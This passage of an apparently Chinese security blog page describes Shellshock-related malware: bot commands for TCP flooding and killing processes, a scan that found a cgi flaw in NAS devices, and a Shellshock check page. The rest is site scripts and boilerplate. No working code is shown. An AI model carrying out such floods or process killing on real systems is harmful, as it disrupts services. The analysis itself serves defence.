<p><a href="http://image.3001.net/images/20140929/14119558712704.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558712704.png%21small" alt="对目标服务器进行TCP洪水攻击"></a></p>
<p>对目标服务器进行TCP洪水攻击</p>
<p><strong>●KILLATTK </strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558833165.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558833165.png%21small" alt="通过接受服务器发来的进程列表,通过kill系统调用杀掉指定的进程"></a></p>
<p>通过接受服务器发来的进程列表,通过kill系统调用杀掉指定的进程</p>
<p><strong>●LOLNOGTFO</strong></p>
<p><a href="http://image.3001.net/images/20140929/14119558966991.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119558966991.png%21small" alt="非法服务器数据包指令"></a></p>
<p>非法服务器数据包指令</p>
<h2 id="三-后台漏洞检测"><a href="#三-后台漏洞检测" class="headerlink" title="三.后台漏洞检测"></a><strong>三.后台漏洞检测</strong></h2><p>漏洞爆发之后,我们在后台对全国范围内的相关网站进行了一次统计,我们发现了某公司的NAS设备管理页面存在cgi漏洞,而通过查看网站页面，发现设备是类似“TS-119P”， 设备名都是TS-XX的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">备注：NAS是一种网络存储设备，现在的很多路由器也支持此功能，如果此设备有漏洞，那么里面的资源都会有被盗的风险。XXX门将会再现江湖</div></pre></td></tr></table></figure>
<p>为此我们搭建了一个后台页面,来对网址进行检测,查看是否存在Bash漏洞</p>
<p><a href="http://image.3001.net/images/20140929/14119559071040.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20140929/14119559071040.png%21small" alt="ShellShock检测页面"></a></p>
<p><strong>检测网址如下:</strong></p>
<p><a href="http://fish.ijinshan.com/cgibincheck" target="_blank" rel="external">http://fish.ijinshan.com/cgibincheck</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/me.jpg"
               alt="Introspelliam" />
          <p class="site-author-name" itemprop="name">Introspelliam</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
           
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
            
              <a href="/archives/">
            
                <span class="site-state-item-count">132</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">16</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">55</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      GitHub
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                    
                      Weibo
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Introspelliam</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>

  <span class="post-meta-divider">|</span>

  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  










  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
  


  

  

</body>
</html>
